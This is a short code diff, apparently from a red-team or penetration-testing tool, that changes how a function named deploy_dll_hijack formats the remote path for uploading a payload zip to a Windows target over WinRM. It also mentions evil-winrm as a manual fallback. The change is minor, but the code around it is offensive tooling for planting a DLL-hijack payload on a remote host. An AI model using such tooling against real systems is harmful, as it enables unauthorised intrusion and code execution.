@@ -183,6 +183,7 @@ def deploy_dll_hijack(
         host=target_host or None,
     )
     remote_path = f"{drop_path.rstrip('\\')}\\{zip_name}"
+    remote_path_fwd = remote_path.replace("\\", "/")
     client = _winrm_client(cred, session)
     target_arch = _resolve_target_arch(finding, scan, client=client, arch_override=arch)
     print_info(f"payload arch: {target_arch}")
@@ -293,8 +294,8 @@ def deploy_dll_hijack(
                 shell="powershell",
             )
 
-        upload_file(client, build.zip_path, remote_path, http_fetch_host=fetch_host)
-        if not remote_file_ok(client, remote_path, expected_size=build.zip_path.stat().st_size):
+        upload_file(client, build.zip_path, remote_path_fwd, http_fetch_host=fetch_host)
+        if not remote_file_ok(client, remote_path_fwd, expected_size=build.zip_path.stat().st_size):
             raise RuntimeError(
                 "upload not verified on target — use interactive evil-winrm: "
                 f"upload {build.zip_path.resolve()} {remote_path}"
